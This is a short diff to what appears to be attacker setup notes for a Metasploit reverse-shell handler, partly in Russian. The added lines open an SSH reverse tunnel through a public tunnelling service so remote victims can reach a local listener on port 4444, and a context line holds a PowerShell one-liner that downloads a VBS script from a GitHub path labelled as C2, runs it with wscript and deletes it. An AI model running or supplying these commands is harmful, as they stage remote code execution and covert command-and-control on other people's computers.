@@ -8,4 +8,7 @@ set LPORT ВАШ_ВНЕШНИЙ_ПОРТ
 set ReverseListenerBindAddress 127.0.0.1
 set ReverseListenerBindPort 4444
 
+ssh -p 443 -R0:localhost:4444 tcp@free.pinggy.io | tee pinggy.txt
+cat pinggy.txt
+
 powershell -c "$p=[IO.Path]::Combine($env:TEMP, 's.vbs'); iwr 'https://raw.githubusercontent.com/gaca9302/usb/refs/heads/main/c2.1/s.vbs' -OutFile $p; Start-Process wscript.exe $p -Wait; rm $p"
